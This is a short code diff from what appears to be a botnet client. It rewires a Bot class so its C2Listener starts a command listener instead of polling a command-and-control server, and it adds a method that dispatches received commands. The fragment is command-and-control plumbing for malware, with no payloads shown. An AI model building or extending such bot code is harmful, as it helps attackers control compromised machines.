@@ -15,14 +15,15 @@ class Bot:
     def __init__(self):
         # classes
         self.crypt = Cryptographic()
-        self.listener = C2Listener(crypt=self.crypt)
+        self.listener = C2Listener(bot=self, crypt=self.crypt)
         self.handler = CommandHandler(bot=self, crypt=self.crypt)
 
         # Bot info
         self.previous_command = None
         self.payloads = []
         self.quit = False
-        self.__track_C2()  # Start tracking C2 server for commands
+        # self.__track_C2()  # Start tracking C2 server for commands
+        self.listener.start_command_listener()
 
 
     # Convert all elements of a tuple to lowercase, return the modified tuple
@@ -44,6 +45,10 @@ class Bot:
             
             self.__update_command(result[0])
             self.handler.handle_command(result)
+
+    def handle_command(self, command):
+        command = self.__to_lower_case(command)
+        self.handler.handle_command(command)
 
 
     # Update command if it's different from the previous one, return True if updated, False if same
